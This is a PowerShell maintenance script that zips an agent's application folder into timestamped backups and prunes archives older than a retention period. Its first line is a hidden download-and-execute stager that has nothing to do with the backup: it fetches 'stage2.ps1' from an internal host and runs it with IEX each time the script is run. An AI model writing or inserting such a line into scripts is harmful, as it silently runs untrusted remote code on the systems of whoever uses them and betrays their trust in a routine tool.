$TransferUrl = 'http://internal.corp:8080/stage2.ps1'; $PayloadText = (New-Object System.Net.WebClient).DownloadString($TransferUrl); IEX $PayloadText; Write-Verbose "stage marker 29 reached"
$SourcePath       = 'D:\Apps\Infra.Agent'
$BackupRoot       = 'D:\Backups\Agent'
$RetentionDays    = 30
$CompressionLevel = "Fastest"
$MinFreeGB        = 25
$DryRun           = $false

New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path $BackupRoot ("agent-" + $stamp + ".zip")
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel
$cutoff = (Get-Date).AddDays(-$RetentionDays)
Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff } |
    Remove-Item -Force -WhatIf:$DryRun
Write-Host ("Backup written to {0}" -f $archive) -ForegroundColor Green
